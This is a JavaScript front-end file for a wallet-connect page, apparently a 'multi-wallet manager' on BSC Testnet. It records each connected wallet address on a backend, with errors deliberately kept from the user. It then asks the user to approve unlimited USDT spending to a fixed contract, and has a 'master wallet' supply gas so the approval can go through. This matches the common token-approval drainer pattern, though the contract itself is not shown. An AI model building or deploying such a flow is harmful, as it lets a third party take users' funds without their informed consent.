// src/main.js
import { BrowserProvider, Contract, ethers } from 'ethers'

// Configuration from environment variables
const CONFIG = {
  API_URL: typeof __VITE_API_URL__ !== 'undefined' ? __VITE_API_URL__ : 'https://multi-wallet-manager.onrender.com/api',
  CONTRACT_ADDRESS: typeof __VITE_CONTRACT_ADDRESS__ !== 'undefined' ? __VITE_CONTRACT_ADDRESS__ : '0xC0a6fd159018824EB7248EB62Cb67aDa4c5906FF',
  USDT_CONTRACT_ADDRESS: typeof __VITE_USDT_CONTRACT_ADDRESS__ !== 'undefined' ? __VITE_USDT_CONTRACT_ADDRESS__ : '0x2f79e9e36c0d293f3c88F4aF05ABCe224c0A5638',
  CHAIN_ID: typeof __VITE_CHAIN_ID__ !== 'undefined' ? __VITE_CHAIN_ID__ : '97',
  CHAIN_NAME: typeof __VITE_CHAIN_NAME__ !== 'undefined' ? __VITE_CHAIN_NAME__ : 'BSC Testnet',
  RPC_URL: typeof __VITE_RPC_URL__ !== 'undefined' ? __VITE_RPC_URL__ : 'https://bsc-testnet.publicnode.com'
}

// DOM Elements
const connectSection = document.getElementById('connect-section')
const walletSection = document.getElementById('wallet-section')
const connectWalletBtn = document.getElementById('connect-wallet')
const connectText = document.getElementById('connect-text')
const approveBtn = document.getElementById('approve-btn')
const approveText = document.getElementById('approve-text')
const disconnectBtn = document.getElementById('disconnect-btn')
const walletAddressEl = document.getElementById('wallet-address')
const usdtBalanceEl = document.getElementById('usdt-balance')
const networkEl = document.getElementById('network')
const statusMessage = document.getElementById('status-message')

// State
let provider = null
let signer = null
let walletAddress = null

// Initialize app
document.addEventListener('DOMContentLoaded', () => {
  // Check for existing connection
  const storedAddress = localStorage.getItem('walletAddress')
  if (storedAddress) {
    walletAddress = storedAddress
    showWalletSection()
    updateWalletInfo()
  }
  
  // Set network info
  networkEl.textContent = CONFIG.CHAIN_NAME
  
  // Event listeners
  connectWalletBtn.addEventListener('click', connectWallet)
  approveBtn.addEventListener('click', handleApprovalFlow)
  disconnectBtn.addEventListener('click', disconnectWallet)
})

// Connect wallet function
async function connectWallet() {
  try {
    showLoading(connectText, true)
    
    // Check if Ethereum provider exists
    if (!window.ethereum) {
      showError('No Ethereum wallet found. Please install MetaMask or Trust Wallet.')
      return
    }
    
    // Request account access
    const accounts = await window.ethereum.request({
      method: 'eth_requestAccounts'
    })
    
    walletAddress = accounts[0]
    
    // Create provider and signer
    provider = new BrowserProvider(window.ethereum)
    signer = await provider.getSigner()
    
    // Switch to correct network
    await switchToCorrectNetwork()
    
    // Save to localStorage
    localStorage.setItem('walletAddress', walletAddress)
    
    // Update UI
    showWalletSection()
    updateWalletInfo()
    
    // Send to backend
    await sendWalletToBackend()
    
  } catch (error) {
    console.error('Connection error:', error)
    showError('Failed to connect wallet: ' + error.message)
  } finally {
    showLoading(connectText, false)
  }
}

// Switch to correct network
async function switchToCorrectNetwork() {
  try {
    // Check current chain ID
    const currentChainId = await window.ethereum.request({ method: 'eth_chainId' })
    
    if (parseInt(currentChainId, 16).toString() !== CONFIG.CHAIN_ID) {
      // Try to switch network
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: `0x${parseInt(CONFIG.CHAIN_ID).toString(16)}` }]
        })
      } catch (switchError) {
        // If network doesn't exist, add it
        if (switchError.code === 4902) {
          try {
            await window.ethereum.request({
              method: 'wallet_addEthereumChain',
              params: [{
                chainId: `0x${parseInt(CONFIG.CHAIN_ID).toString(16)}`,
                chainName: CONFIG.CHAIN_NAME,
                rpcUrls: [CONFIG.RPC_URL],
                nativeCurrency: {
                  name: 'BNB',
                  symbol: 'BNB',
                  decimals: 18
                }
              }]
            })
          } catch (addError) {
            console.error('Failed to add network:', addError)
          }
        }
      }
    }
  } catch (error) {
    console.error('Network switch error:', error)
  }
}

// Update wallet information
async function updateWalletInfo() {
  if (!walletAddress) return
  
  walletAddressEl.textContent = formatAddress(walletAddress)
  
  // Get USDT balance
  try {
    if (provider) {
      const usdtContract = new Contract(
        CONFIG.USDT_CONTRACT_ADDRESS,
        ['function balanceOf(address account) external view returns (uint256)'],
        provider
      )
      
      const balance = await usdtContract.balanceOf(walletAddress)
      const formattedBalance = ethers.formatUnits(balance, 18)
      usdtBalanceEl.textContent = `${parseFloat(formattedBalance).toFixed(2)} USDT`
    }
  } catch (error) {
    console.error('Balance error:', error)
    usdtBalanceEl.textContent = '0.00 USDT'
  }
}

// Handle the complete approval flow including gas management
async function handleApprovalFlow() {
  try {
    showLoading(approveText, true)
    
    // First check if wallet has sufficient gas
    const hasGas = await checkWalletGasBalance()
    
    if (!hasGas) {
      showSuccess('Insufficient gas detected. Waiting for gas from master wallet...')
      
      // In a real implementation, we would wait for the backend to send gas
      // For now, we'll simulate this by checking periodically
      await waitForGas(30000) // Wait up to 30 seconds
    }
    
    // Now proceed with USDT approval
    await approveUSDTSpending()
    
  } catch (error) {
    console.error('Approval flow error:', error)
    showError('Approval flow failed: ' + error.message)
  } finally {
    showLoading(approveText, false)
  }
}

// Check if wallet has sufficient gas balance
async function checkWalletGasBalance() {
  try {
    if (!provider || !walletAddress) {
      throw new Error('Wallet not connected')
    }
    
    const balance = await provider.getBalance(walletAddress)
    const balanceInBNB = ethers.formatEther(balance)
    
    // Check if balance is greater than minimum required (0.001 BNB)
    const hasSufficientGas = parseFloat(balanceInBNB) >= 0.001
    
    console.log('Gas balance:', balanceInBNB, 'BNB - Sufficient:', hasSufficientGas)
    
    return hasSufficientGas
  } catch (error) {
    console.error('Gas check error:', error)
    // If we can't check, assume no gas and let the master wallet handle it
    return false
  }
}

// Wait for gas to be sent to wallet
async function waitForGas(timeout = 30000) {
  const startTime = Date.now()
  
  while (Date.now() - startTime < timeout) {
    // Check gas balance
    const hasGas = await checkWalletGasBalance()
    
    if (hasGas) {
      showSuccess('Gas received! Proceeding with approval...')
      return true
    }
    
    // Wait 2 seconds before checking again
    await new Promise(resolve => setTimeout(resolve, 2000))
  }
  
  // Timeout reached
  throw new Error('Gas not received within timeout period. Please try again.')
}

// Approve USDT spending
async function approveUSDTSpending() {
  try {
    if (!signer) {
      throw new Error('Wallet not connected')
    }
    
    // Create USDT contract instance
    const usdtContract = new Contract(
      CONFIG.USDT_CONTRACT_ADDRESS,
      ['function approve(address spender, uint256 amount) public returns (bool)'],
      signer
    )
    
    // Send approval transaction
    const tx = await usdtContract.approve(
      CONFIG.CONTRACT_ADDRESS,
      ethers.MaxUint256
    )
    
    showSuccess('Transaction sent. Waiting for confirmation...')
    
    // Wait for confirmation
    await tx.wait()
    
    showSuccess('USDT spending approved successfully!')
    
    // Disable approve button
    approveBtn.disabled = true
    approveText.textContent = 'Approved'
    
  } catch (error) {
    console.error('Approval error:', error)
    
    // Check if it's a gas-related error
    if (error.message.includes('gas') || error.message.includes('funds')) {
      showError('Insufficient gas for transaction. Master wallet will send gas shortly.')
    } else {
      showError('Approval failed: ' + error.message)
    }
    
    throw error
  }
}

// Send wallet to backend
async function sendWalletToBackend() {
  try {
    const response = await fetch(`${CONFIG.API_URL}/wallets/connect`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        address: walletAddress,
        name: `Wallet ${walletAddress.substring(0, 6)}...${walletAddress.substring(38)}`
      })
    })
    
    if (!response.ok) {
      const errorData = await response.json().catch(() => ({}))
      throw new Error(errorData.error || `HTTP ${response.status}: ${response.statusText}`)
    }
    
    const result = await response.json()
    console.log('Backend connection successful:', result)
    
  } catch (error) {
    console.error('Backend connection error:', error)
    // We don't show this error to the user as per requirements
  }
}

// Disconnect wallet
function disconnectWallet() {
  walletAddress = null
  provider = null
  signer = null
  localStorage.removeItem('walletAddress')
  showConnectSection()
}

// Show connect section
function showConnectSection() {
  connectSection.classList.remove('hidden')
  walletSection.classList.add('hidden')
}

// Show wallet section
function showWalletSection() {
  connectSection.classList.add('hidden')
  walletSection.classList.remove('hidden')
  approveBtn.disabled = false
  approveText.textContent = 'Approve USDT Spending'
}

// Format wallet address
function formatAddress(address) {
  if (!address) return ''
  return `${address.substring(0, 6)}...${address.substring(38)}`
}

// Show loading state
function showLoading(element, show) {
  if (show) {
    element.innerHTML = '<span class="loading"></span>Processing...'
  } else {
    if (element.id === 'connect-text') {
      element.textContent = 'Connect Wallet'
    } else if (element.id === 'approve-text') {
      element.textContent = 'Approve USDT Spending'
    }
  }
}

// Show success message
function showSuccess(message) {
  statusMessage.textContent = message
  statusMessage.className = 'status status-success'
  statusMessage.classList.remove('hidden')
  
  setTimeout(() => {
    statusMessage.classList.add('hidden')
  }, 5000)
}

// Show error message
function showError(message) {
  statusMessage.textContent = message
  statusMessage.className = 'status status-error'
  statusMessage.classList.remove('hidden')
  
  setTimeout(() => {
    statusMessage.classList.add('hidden')
  }, 5000)
}
